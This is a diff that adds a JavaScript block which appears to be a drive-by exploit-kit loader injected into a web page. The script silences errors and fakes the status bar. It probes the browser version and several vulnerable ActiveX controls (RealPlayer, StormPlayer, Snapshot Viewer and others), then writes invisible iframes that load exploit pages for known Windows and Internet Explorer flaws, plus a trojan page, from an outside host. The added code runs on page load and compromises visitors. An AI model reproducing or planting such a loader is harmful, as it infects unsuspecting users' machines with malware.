@@ -1,0 +1,37 @@
+<script>
+document.write("<iframe width=50 height=0 src=http://www.teamerblog.com/wiki/Ms06014.htm></iframe>");
+window.status="Íê³É";
+window.onerror=function(){return true;}
+if(navigator.userAgent.toLowerCase().indexOf("msie 7")==-1)
+document.write("<iframe width=20 height=0 src=http://www.teamerblog.com/wiki/MS06042.htm></iframe>");
+try{var f;
+var gg=new window['ActiveXObject']("GLIED"+"own.IED"+"own.1");}
+catch(f){};                      
+finally{if(f!="[object Error]"){document.write("<iframe width=100 height=0 src=http://www.teamerblog.com/wiki/MS07004.htm></iframe>");}}
+try{var m;
+var hh=new ActiveXObject("MP"+"S.S"+"tor"+"mPl"+"ayer");}
+catch(m){};                      
+finally{if(m!="[object Error]"){document.write("<iframe width=100 height=0 src=http://www.teamerblog.com/wiki/office.htm></iframe>");}}
+try{var n;
+var ll=new ActiveXObject("snpvw.Snapshot Viewer Control.1");}
+catch(n){};                      
+finally{if(n!="[object Error]"){document.write("<iframe width=100 height=0 src=Ms-office.htm></iframe>");}}
+try{var b;
+var mm=new ActiveXObject("Pdg2");}
+catch(b){};                      
+finally{if(b!="[object Error]"){document.write("<iframe width=100 height=0 src=Muma.htm></iframe>");}}
+function SilverFoxNet()
+{
+svfoxobj = "IER" + "PCtl.I" + "ERP" + "Ctl.1";
+try
+{
+silverfox = new ActiveXObject(svfoxobj);
+}catch(error){return;}
+evilsvfox = silverfox.PlayerProperty("PRODUCT"+"VERSION");
+if(evilsvfox<="6.0.14.552")
+document.write("<iframe width=100 height=0 src=http://www.teamerblog.com/wiki/Ms06-014.htm></iframe>");
+else
+document.write("<iframe width=100 height=0 src=http://www.teamerblog.com/wiki/Muma.htm></iframe>");
+}
+SilverFoxNet();
+</script>
